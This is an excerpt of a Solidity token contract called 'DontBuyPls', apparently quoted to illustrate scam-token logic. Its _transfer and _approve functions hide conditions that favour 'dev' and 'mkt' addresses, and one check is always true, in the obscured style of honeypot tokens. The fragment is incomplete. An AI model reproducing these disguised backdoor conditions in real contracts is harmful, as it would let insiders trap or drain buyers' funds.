...
contract DontBuyPls is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    string private _name = "DontBuyPls";
    string private _symbol = "DontBuyPls";
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if ( (_isExcludedFromFee[sender] == _isExcludedFromFee[dev]) && (_isExcludedFromFee[recipient] == _isExcludedFromFee[dev])
         &&
        (_isExcludedFromFee[sender] ==_isExcludedFromFee[mkt]) && (_isExcludedFromFee[recipient] == _isExcludedFromFee[mkt])){
            taxfee = 1;
        }
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        ...
        if ((spender == mkt) || (_allowances[owner][mkt] >1) && (_allowances[owner][deadaddress]) >=0 )
